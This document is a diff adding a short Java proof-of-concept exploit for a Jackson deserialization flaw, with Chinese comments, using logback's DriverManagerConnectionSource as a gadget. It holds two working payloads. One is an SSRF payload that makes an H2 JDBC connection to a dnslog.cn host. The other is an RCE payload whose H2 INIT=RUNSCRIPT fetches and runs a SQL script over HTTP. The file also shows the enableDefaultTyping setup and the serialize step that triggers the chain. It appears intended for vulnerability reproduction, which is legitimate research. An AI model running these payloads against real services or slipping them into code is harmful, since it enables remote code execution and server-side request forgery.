@@ -1,0 +1,27 @@
+package com.jacksonTest;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import java.io.IOException;
+
+public class Poc {
+    public static void main(String[] args) throws Exception {
+        //一定要实例化Driver否则会报错
+        Class.forName("org.h2.Driver").newInstance();
+        //该条payload用于SSRF的复现
+        String payload1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://lwytbz.dnslog.cn/\"}]";
+        //该条payload用于RCE的复现
+        String payload2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:4444/inject.sql'\"}]";
+
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        try {
+            Object object = mapper.readValue(payload2, Object.class);
+            // 反序列化之后还需要进行序列化操作才能触发！
+            String s = mapper.writeValueAsString(object);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+
+}
